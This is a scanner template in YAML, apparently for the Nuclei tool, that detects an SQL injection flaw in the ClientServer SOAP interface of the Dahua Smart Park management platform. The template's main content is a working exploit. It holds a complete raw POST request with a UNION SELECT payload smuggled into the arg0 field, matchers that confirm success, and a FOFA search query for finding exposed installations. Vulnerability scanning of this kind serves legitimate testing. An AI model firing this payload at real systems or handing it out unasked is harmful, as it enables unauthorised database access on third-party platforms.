poc/sql/dahua-clientserver-sqli.yaml

id: dahua-clientserver-sqli

info:
  name: Dahua Smart Park ClientServer SQL Injection Vulnerability
  author: Co5mos
  severity: high
  description: Dahua Smart Park ClientServer interface SQL injection vulnerability through SOAP request.
  reference: 
    - https://github.com/wy876/POC/blob/9ffe279891f6c9b48ed680188ef10fc06a787f67/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BAclientServer%E6%8E%A5%E5%8F%A3SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md?plain=1#L6
  metadata:
    fofa-query: app="dahua-智慧园区综合管理平台"
  tags: dahua,sqli

http:
  - raw:
      - |
        POST /portal/services/clientServer HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
        Content-Type: text/xml;charset=UTF-8
        Content-Length: ContentLength

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:cli="http://clientServer.webservice.dssc.dahua.com">
          <soapenv:Header/>
          <soapenv:Body>
          <cli:getGroupInfoListByGroupId>
            <arg0>-5398) UNION ALL SELECT 5336,5336,5336,5336,md5(999999999)-- -</arg0>
            <arg1>10</arg1>
          </cli:getGroupInfoListByGroupId>
          </soapenv:Body>
        </soapenv:Envelope>
    
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "c8c605999f3d8352d7bb792cf3fdb25"
      
      - type: status
        status:
          - 200